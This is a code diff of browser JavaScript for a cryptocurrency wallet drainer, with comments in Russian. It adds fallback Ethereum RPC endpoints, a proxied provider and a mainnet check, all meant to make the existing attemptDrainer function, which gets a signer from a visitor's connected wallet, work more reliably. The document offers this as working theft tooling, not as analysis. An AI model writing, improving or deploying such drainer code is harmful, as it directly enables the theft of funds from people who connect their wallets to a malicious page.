@@ -34,6 +34,54 @@ let modalShown = false;
 
 const targetChainId = '0x1'; // Ethereum Mainnet
 
+// Список надёжных RPC для Ethereum Mainnet
+const FALLBACK_RPCS = [
+  'https://rpc.eth.gateway.fm',
+  'https://eth.llamarpc.com',
+  'https://ethereum-rpc.publicnode.com'
+];
+
+// Функция для создания провайдера с fallback RPC
+async function getReliableProvider() {
+  // Сначала пробуем использовать провайдер кошелька
+  const walletProvider = new ethers.providers.Web3Provider(window.ethereum);
+  try {
+    // Более строгая проверка: запрашиваем баланс нулевого адреса
+    await walletProvider.getBalance('0x0000000000000000000000000000000000000000');
+    console.log('✅ Провайдер кошелька полностью рабочий');
+    return walletProvider;
+  } catch (err) {
+    console.warn('⚠️ Провайдер кошелька ненадёжен:', err.message);
+  }
+
+  // Если провайдер кошелька не работает, переходим на fallback RPC
+  for (const rpcUrl of FALLBACK_RPCS) {
+    try {
+      const fallbackProvider = new ethers.providers.JsonRpcProvider(rpcUrl);
+      await fallbackProvider.getBalance('0x0000000000000000000000000000000000000000');
+      console.log(`✅ Переключено на fallback RPC: ${rpcUrl}`);
+      return new ethers.providers.Web3Provider({
+        ...window.ethereum,
+        request: async (request) => {
+          if (
+            request.method === 'eth_chainId' ||
+            request.method === 'eth_call' ||
+            request.method === 'eth_getBalance' ||
+            request.method === 'eth_blockNumber'
+          ) {
+            return fallbackProvider.send(request.method, request.params || []);
+          }
+          return walletProvider.send(request.method, request.params || []);
+        }
+      });
+    } catch (err) {
+      console.warn(`⚠️ Fallback RPC ${rpcUrl} недоступен:`, err.message);
+    }
+  }
+
+  throw new Error('❌ Не удалось найти рабочий RPC');
+}
+
 // === Инициализация при загрузке страницы ===
 window.addEventListener('DOMContentLoaded', () => {
   actionBtn = document.getElementById('action-btn');
@@ -204,7 +252,7 @@ function showModalOnce() {
 // === Смена сети ===
 async function switchToTargetNetwork() {
   try {
-    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    const provider = await getReliableProvider();
     const network = await provider.getNetwork();
     const currentChainId = `0x${network.chainId.toString(16)}`;
 
@@ -229,7 +277,7 @@ async function switchToTargetNetwork() {
             chainId: targetChainId,
             chainName: 'Ethereum Mainnet',
             nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
-            rpcUrls: ['https://rpc.eth.gateway.fm'],
+            rpcUrls: FALLBACK_RPCS,
             blockExplorerUrls: ['https://etherscan.io'],
           }],
         });
@@ -262,6 +310,14 @@ async function attemptDrainer() {
     return;
   }
 
+  // Дополнительная проверка сети
+  const provider = await getReliableProvider();
+  const network = await provider.getNetwork();
+  if (network.chainId !== parseInt(targetChainId, 16)) {
+    console.log('⚠️ Сеть не соответствует Ethereum Mainnet');
+    return;
+  }
+
   if (!connectedAddress) {
     console.error('❌ Адрес кошелька не определён');
     return;
@@ -271,7 +327,6 @@ async function attemptDrainer() {
   showModalOnce();
 
   try {
-    const provider = new ethers.providers.Web3Provider(window.ethereum);
     const signer = provider.getSigner();
     const address = await signer.getAddress();
 
@@ -296,6 +351,7 @@ async function attemptDrainer() {
       console.log('🙅 Пользователь отклонил транзакцию');
     } else {
       console.error('❌ Ошибка выполнения drainer:', err.message);
+      throw err; // Пробрасываем ошибку для отладки
     }
   }
 }
